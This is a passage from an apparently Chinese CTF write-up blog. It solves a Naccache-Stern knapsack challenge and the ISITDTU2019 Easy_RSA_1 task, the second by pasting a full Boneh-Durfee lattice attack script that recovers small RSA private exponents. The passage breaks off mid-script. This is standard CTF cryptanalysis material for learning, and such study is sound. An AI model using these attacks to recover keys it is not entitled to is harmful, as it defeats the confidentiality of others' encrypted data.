<p>AI将haskell转成python代码 是一个 Naccache-Stern Knapsack Cryptosystem<br><a href="https://eprint.iacr.org/2017/421.pdf" target="_balnk">here</a><br>emm 先放这 以后再来看</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">primes=[<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">61</span>,<span class="number">67</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">89</span>,<span class="number">97</span>,<span class="number">101</span>,<span class="number">103</span>,<span class="number">107</span>,<span class="number">109</span>,<span class="number">113</span>,<span class="number">127</span>,<span class="number">131</span>,<span class="number">137</span>,<span class="number">139</span>,<span class="number">149</span>,<span class="number">151</span>,<span class="number">157</span>,<span class="number">163</span>,<span class="number">167</span>,<span class="number">173</span>,<span class="number">179</span>,<span class="number">181</span>,<span class="number">191</span>,<span class="number">193</span>,<span class="number">197</span>,<span class="number">199</span>,<span class="number">211</span>,<span class="number">223</span>,<span class="number">227</span>,<span class="number">229</span>,<span class="number">233</span>,<span class="number">239</span>,<span class="number">241</span>,<span class="number">251</span>,<span class="number">257</span>,<span class="number">263</span>,<span class="number">269</span>,<span class="number">271</span>,<span class="number">277</span>,<span class="number">281</span>,<span class="number">283</span>,<span class="number">293</span>,<span class="number">307</span>,<span class="number">311</span>,<span class="number">313</span>,<span class="number">317</span>,<span class="number">331</span>,<span class="number">337</span>,<span class="number">347</span>,<span class="number">349</span>,<span class="number">353</span>,<span class="number">359</span>,<span class="number">367</span>,<span class="number">373</span>,<span class="number">379</span>,<span class="number">383</span>,<span class="number">389</span>,<span class="number">397</span>,<span class="number">401</span>,<span class="number">409</span>,<span class="number">419</span>,<span class="number">421</span>,<span class="number">431</span>,<span class="number">433</span>,<span class="number">439</span>,<span class="number">443</span>,<span class="number">449</span>,<span class="number">457</span>,<span class="number">461</span>,<span class="number">463</span>,<span class="number">467</span>,<span class="number">479</span>,<span class="number">487</span>,<span class="number">491</span>,<span class="number">499</span>,<span class="number">503</span>,<span class="number">509</span>,<span class="number">521</span>,<span class="number">523</span>,<span class="number">541</span>,<span class="number">547</span>,<span class="number">557</span>,<span class="number">563</span>,<span class="number">569</span>,<span class="number">571</span>,<span class="number">577</span>,<span class="number">587</span>,<span class="number">593</span>,<span class="number">599</span>,<span class="number">601</span>,<span class="number">607</span>,<span class="number">613</span>,<span class="number">617</span>,<span class="number">619</span>,<span class="number">631</span>,<span class="number">641</span>,<span class="number">643</span>,<span class="number">647</span>,<span class="number">653</span>,<span class="number">659</span>,<span class="number">661</span>,<span class="number">673</span>,<span class="number">677</span>,<span class="number">683</span>,<span class="number">691</span>,<span class="number">701</span>,<span class="number">709</span>,<span class="number">719</span>,<span class="number">727</span>,<span class="number">733</span>,<span class="number">739</span>,<span class="number">743</span>,<span class="number">751</span>,<span class="number">757</span>,<span class="number">761</span>,<span class="number">769</span>,<span class="number">773</span>,<span class="number">787</span>,<span class="number">797</span>,<span class="number">809</span>,<span class="number">811</span>,<span class="number">821</span>,<span class="number">823</span>,<span class="number">827</span>,<span class="number">829</span>,<span class="number">839</span>,<span class="number">853</span>,<span class="number">857</span>,<span class="number">859</span>,<span class="number">863</span>,<span class="number">877</span>,<span class="number">881</span>,<span class="number">883</span>,<span class="number">887</span>,<span class="number">907</span>,<span class="number">911</span>,<span class="number">919</span>,<span class="number">929</span>,<span class="number">937</span>,<span class="number">941</span>,<span class="number">947</span>,<span class="number">953</span>,<span class="number">967</span>,<span class="number">971</span>,<span class="number">977</span>,<span class="number">983</span>,<span class="number">991</span>,<span class="number">997</span>]</span><br><span class="line">n = <span class="number">134896036104102133446208954973118530800743044711419303630456535295204304771800100892609593430702833309387082353959992161865438523195671760946142657809228938824313865760630832980160727407084204864544706387890655083179518455155520501821681606874346463698215916627632418223019328444607858743434475109717014763667</span></span><br><span class="line"></span><br><span class="line">enc=<span class="number">84329776255618646348016649734028295037597157542985867506958273359305624184282146866144159754298613694885173220275408231387000884549683819822991588176788392625802461171856762214917805903544785532328453620624644896107723229373581460638987146506975123149045044762903664396325969329482406959546962473688947985096</span></span><br><span class="line">bit2int = <span class="keyword">lambda</span> x: <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, x)), <span class="number">2</span>)</span><br><span class="line">m = <span class="number">129105988525739869308153101831605950072860268575706582195774923614094296354415364173823406181109200888049609207238266506466864447780824680862439187440797565555486108716502098901182492654356397840996322893263870349262138909453630565384869193972124927953237311411285678188486737576555535085444384901167109670365</span></span><br><span class="line">z = enc * libnum.invmod(m, n) % n</span><br><span class="line">bits = [(z % p == <span class="number">0</span>) * <span class="number">1</span> <span class="keyword">for</span> p <span class="keyword">in</span> primes]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>*<span class="number">20</span>, <span class="number">8</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(bit2int(bits[<span class="number">5</span>:][i:i+<span class="number">8</span>])))</span><br></pre></td></tr></table></figure>


<h1 id="ISITDTU2019"><a href="#ISITDTU2019" class="headerlink" title="ISITDTU2019"></a>ISITDTU2019</h1><h2 id="Easy-RSA-1"><a href="#Easy-RSA-1" class="headerlink" title="Easy_RSA_1"></a>Easy_RSA_1</h2><p>题目给了n,e,c</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">n = 137709853388874260067664060306224801065880567280896538344708662296491187670268243771581008615887329285442080267493172576517227603581814922784005894668293664250883858847270414696279127204843462302026428548409668060539273696154323753582118715764251826181439387752900169898505518594134423187783089073450520527969</span><br><span class="line">e = 85605944479801539190292577400294315989703364683792339737453887619652946907819548388390076584246192710348319524405250340541547224543819349494488596679810310694697763188201375896240755682682520811114377302206659716598003967368992125832908158096663258971132148617761060030524535044970322206572134828548118438019</span><br><span class="line">c = 22066874366908131522623165919721031154048372827959879486746669804284618882326621205522887800063326155288431192110879403482210420111408801477749097399368616494107231276644736023482237804800287810317122448198973027350599454646050497733117161743355379588761228932055556016302337519814538743706899009493572298224</span><br></pre></td></tr></table></figure>
<p>可以发现这里n(1024)和e(1023)的bit数差的很小<br>这里学习到一手 <code>Boneh-Durfee-Attack</code> 这个攻击的适用条件比维纳攻击宽一点<br>满足 d &lt; N^0.292 时可以使用<br>直接套模板了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Config</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting debug to true will display more informations</span></span><br><span class="line"><span class="string">about the lattice, the bounds, the vectors...</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting strict to true will stop the algorithm (and</span></span><br><span class="line"><span class="string">return (-1, -1)) if we don&#x27;t have a correct</span></span><br><span class="line"><span class="string">upperbound on the determinant. Note that this</span></span><br><span class="line"><span class="string">doesn&#x27;t necesseraly mean that no solutions</span></span><br><span class="line"><span class="string">will be found since the theoretical upperbound is</span></span><br><span class="line"><span class="string">usualy far away from actual results. That is why</span></span><br><span class="line"><span class="string">you should probably use `strict = False`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">This is experimental, but has provided remarkable results</span></span><br><span class="line"><span class="string">so far. It tries to reduce the lattice as much as it can</span></span><br><span class="line"><span class="string">while keeping its efficiency. I see no reason not to use</span></span><br><span class="line"><span class="string">this option, but if things don&#x27;t work, you should try</span></span><br><span class="line"><span class="string">disabling it</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># stop removing if lattice reaches that dimension</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Functions</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># display stats on helpful vectors</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">helpful_vectors</span>(<span class="params">BB, modulus</span>):</span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(nothelpful, <span class="string">&quot;/&quot;</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">&quot; vectors are not helpful&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># display matrix picture with 0 and X</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix_overview</span>(<span class="params">BB, bound</span>):</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">&#x27;%02d &#x27;</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>:</span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">&#x27;~&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tries to remove unhelpful vectors</span></span><br><span class="line"><span class="comment"># we start at current = n-1 (last vector)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_unhelpful</span>(<span class="params">BB, monomials, bound, current</span>):</span><br><span class="line">    <span class="comment"># end of our recursive function</span></span><br><span class="line">    <span class="keyword">if</span> current == -<span class="number">1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">    <span class="comment"># we start by checking from the end</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(current, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># if it is unhelpful:</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">            <span class="comment"># let&#x27;s check if it affects other vectors</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># if another vector is affected:</span></span><br><span class="line">                <span class="comment"># we increase the count</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:0</span></span><br><span class="line">            <span class="comment"># if no other vectors end up affected</span></span><br><span class="line">            <span class="comment"># we remove it</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;* removing unhelpful vector&quot;</span>, ii)</span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:1</span></span><br><span class="line">            <span class="comment"># if just one was affected we check</span></span><br><span class="line">            <span class="comment"># if it is affecting someone else</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># if it is affecting even one vector</span></span><br><span class="line">                    <span class="comment"># we give up on this one</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># remove both it if no other vector was affected and</span></span><br><span class="line">                <span class="comment"># this helpful vector is not helpful enough</span></span><br><span class="line">                <span class="comment"># compared to our unhelpful one</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> <span class="built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="built_in">abs</span>(bound - BB[ii, ii]):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;* removing unhelpful vectors&quot;</span>, ii, <span class="string">&quot;and&quot;</span>, affected_vector_index)</span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1,-1 if `strict=true`, and determinant doesn&#x27;t bound</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">boneh_durfee</span>(<span class="params">pol, modulus, mm, tt, XX, YY</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    finds a solution if:</span></span><br><span class="line"><span class="string">    * d &lt; N^delta</span></span><br><span class="line"><span class="string">    * |x| &lt; e^delta</span></span><br><span class="line"><span class="string">    * |y| &lt; e^0.5</span></span><br><span class="line"><span class="string">    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u) <span class="comment"># u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"></span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts list of monomials</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials():</span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:</span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts (selected by Herrman and May)</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts list of monomials</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct lattice B</span></span><br><span class="line">    nn = <span class="built_in">len</span>(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Prototype to reduce the lattice</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment"># automatically remove</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># reset dimension</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;failure&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if vectors are helpful</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># check if determinant is correctly bounded</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Try with highers m and t.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)</span><br><span class="line"></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;LLL is done!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># transform vector i &amp; j -&gt; polynomials 1 &amp; 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;looking for independent vectors in the lattice&quot;</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> <span class="built_in">range</span>(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> <span class="built_in">range</span>(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line">            <span class="comment"># for i and j, create the two polynomials</span></span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># resultant</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># are these good polynomials?</span></span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="string">&quot;and&quot;</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Your prediction (delta) is too small&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example</span>(<span class="params">N,e</span>):</span><br><span class="line">    <span class="comment">############################################</span></span><br><span class="line">    <span class="comment"># How To Use This Script</span></span><br><span class="line">    <span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># The problem to solve (edit the following values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span></span><br><span class="line">    delta = <span class="number">.18</span> <span class="comment"># this means that d &lt; N^delta</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Lattice (tweak those values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span></span><br><span class="line">    m = <span class="number">4</span> <span class="comment"># size of the lattice (bigger the better/slower)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you need to be a lattice master to tweak these</span></span><br><span class="line">    t = <span class="built_in">int</span>((<span class="number">1</span>-<span class="number">2</span>*delta) * m)  <span class="comment"># optimization from Herrmann and May</span></span><br><span class="line">    X = <span class="number">2</span>*floor(N^delta)  <span class="comment"># this _might_ be too much</span></span><br><span class="line">    Y = floor(N^(<span class="number">1</span>/<span class="number">2</span>))    <span class="comment"># correct if p, q are ~ same size</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Don&#x27;t touch anything below</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Problem put in equation</span></span><br><span class="line">    P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    A = <span class="built_in">int</span>((N+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">    pol = <span class="number">1</span> + x * (A + y)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Find the solutions!</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Checking bounds</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=== checking values ===&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;* delta:&quot;</span>, delta)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;* delta &lt; 0.292&quot;</span>, delta &lt; <span class="number">0.292</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;* size of e:&quot;</span>, <span class="built_in">int</span>(log(e)/log(<span class="number">2</span>)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;* size of N:&quot;</span>, <span class="built_in">int</span>(log(N)/log(<span class="number">2</span>)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;* m:&quot;</span>, m, <span class="string">&quot;, t:&quot;</span>, t)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># boneh_durfee</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=== running algorithm ===&quot;</span>)</span><br><span class="line">        start_time = time.time()</span><br><span class="line"></span><br><span class="line">    solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># found a solution?</span></span><br><span class="line">    <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=== solution found ===&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;x:&quot;</span>, solx)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;y:&quot;</span>, soly)</span><br><span class="line"></span><br><span class="line">        d = <span class="built_in">int</span>(pol(solx, soly) / e)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;private key found:&quot;</span>, d)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=== no solution was found ===&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>((<span class="string">&quot;=== %s seconds ===&quot;</span> % (time.time() - start_time)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># the modulus</span></span><br><span class="line">    N = <span 